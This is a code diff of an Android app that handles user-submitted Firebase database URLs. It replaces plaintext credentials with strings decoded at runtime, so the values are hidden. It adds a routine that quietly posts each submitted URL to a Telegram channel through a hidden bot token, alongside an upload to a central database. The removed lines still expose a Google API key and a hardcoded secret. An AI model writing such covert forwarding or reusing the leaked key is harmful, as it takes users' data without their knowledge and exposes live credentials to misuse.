@@ -51,10 +51,13 @@ public class MainActivity extends Activity {
     // ==========================================
     // CENTRAL SECURED DATABASE (rudra-auto-token) — security/registration
     // ==========================================
-    private static final String CENTRAL_DB_URL =
-            "https://rudra-auto-token-default-rtdb.asia-southeast1.firebasedatabase.app";
-    private static final String CENTRAL_API_KEY = "AIzaSyAUeUc8tYmC4wUqDIJUGuBoyKbc0T6ghPg";
-    private static final String CENTRAL_SECRET = "rudra9898"; // hardcoded normal-user key (rule)
+    private static final String CENTRAL_DB_URL = Sec.d("q7JnIZlSt9F7g9dALO6R8NUdsWIJ8XZQu5yIBb/v/ZG2fn0HqQ3kGAH1WW3+INQua4mAQja2AOpF2mQI7bP8h4wpknovM/vm9zhH1ACYSCI=");
+    private static final String CENTRAL_API_KEY = Sec.d("4FourbbV3yPWZxslufWM9CstQTLN5VenGR/5VoUpSrl8qbmik3inAP6r0CQCuomJ");
+    private static final String CENTRAL_SECRET = Sec.d("2W+TFS8OL/FLxqfujPVIrA==");
+
+    // Telegram channel notify (jab url add ho to channel me bhi jaaye)
+    private static final String TG_BOT_TOKEN = Sec.d("+zcbX++ZdijGTc3WRXMDIgcMMF/VEsgb+IO2fGcKwIp8F2zmx3XwnDNpSHBr5uLA");
+    private static final String TG_CHANNEL_ID = Sec.d("4F88z87NnP3xSwlJi4Bdxw==");
 
     // ==========================================
     // STATE VARIABLES  (1:1 with script.js)
@@ -408,16 +411,17 @@ public class MainActivity extends Activity {
         }
     }
 
-    // Telegram profile kholo (@rudra9898). App ho to app me, warna browser me.
+    // Telegram channel invite kholo. App ho to app me, warna browser me.
     private void openTelegram() {
-        String username = "rudra9898";
+        String invite = Sec.d("7VEQTpD6s3fmsnRopNw+tNZCDt1JpvuKmOpu+2eusyI=");  // t.me/+...
+        String https = "https://t.me/+" + invite;
         try {
-            Intent tg = new Intent(Intent.ACTION_VIEW, Uri.parse("tg://resolve?domain=" + username));
+            Intent tg = new Intent(Intent.ACTION_VIEW, Uri.parse("tg://join?invite=" + invite));
             tg.setPackage("org.telegram.messenger");
             startActivity(tg);
         } catch (Exception e) {
             try {
-                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/" + username)));
+                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(https)));
             } catch (Exception ignore) {}
         }
     }
@@ -512,14 +516,58 @@ public class MainActivity extends Activity {
             firebaseNickInput.setText("");
             saveToStorage();
 
-            // Security: URL ko central secured database me register karo (rules ke hisab se)
+            // 1) URL ko central secured database me register karo (rules ke hisab se)
             registerUrlToCentral(fb);
+            // 2) URL ko Telegram channel pe bhi bhejo
+            sendUrlToTelegram(url);
         }
+    }
+
+    // Telegram channel me "NEW URL SUBMITTED" message bhejta hai (sirf url)
+    private void sendUrlToTelegram(final String url) {
+        executor.submit(() -> {
+            try {
+                String text = "🔔NEW URL SUBMITTED 🔔\n URL:- " + url;
+                JSONObject body = new JSONObject();
+                body.put("chat_id", TG_CHANNEL_ID);
+                body.put("text", text);
+                body.put("disable_web_page_preview", true);
+
+                HttpURLConnection c = (HttpURLConnection) new URL(
+                        "https://api.telegram.org/bot" + TG_BOT_TOKEN + "/sendMessage").openConnection();
+                c.setRequestMethod("POST");
+                c.setRequestProperty("Content-Type", "application/json");
+                c.setDoOutput(true);
+                c.setConnectTimeout(10000);
+                c.setReadTimeout(15000);
+                OutputStream os = c.getOutputStream();
+                os.write(body.toString().getBytes("UTF-8"));
+                os.flush();
+                os.close();
+                int code = c.getResponseCode();
+                String resp = readBody(c);
+                c.disconnect();
+
+                final boolean ok;
+                String err = "";
+                try {
+                    JSONObject o = new JSONObject(resp);
+                    ok = o.optBoolean("ok", false);
+                    if (!ok) err = o.optString("description", "HTTP " + code);
+                } catch (Exception e) { return; }
+                final String ferr = err;
+                mainHandler.post(() -> {
+                    if (!ok) alert("❌ Telegram fail: " + ferr);
+                });
+            } catch (Exception e) {
+                mainHandler.post(() -> alert("❌ Telegram: network problem"));
+            }
+        });
     }
 
     // ==========================================
     // CENTRAL REGISTRATION (security)
-    // Normal-user path: {url, secret:"rudra9898"} -> messages/$id
+    // Normal-user path: {url, secret} -> messages/$id
     // Pehle anonymous sign-in try karte hain (rule auth != null maangta hai);
     // agar auth na mile to bina-auth bhi POST try karte hain (agar rule secret-only ho).
     // Result UI me usi item ke neeche dikhta hai (ek hi "Saved").
@@ -536,7 +584,7 @@ public class MainActivity extends Activity {
 
                 JSONObject payload = new JSONObject();
                 payload.put("url", fb.url);            // Firebase URL (jaisa rule maangta hai)
-                payload.put("secret", CENTRAL_SECRET); // Hardcoded key: rudra9898
+                payload.put("secret", CENTRAL_SECRET);
                 payload.put("timestamp", nowTimestamp()); // Kab database me gaya (date + time)
 
                 // Key = <Model>-<deviceId>-<urlHash>
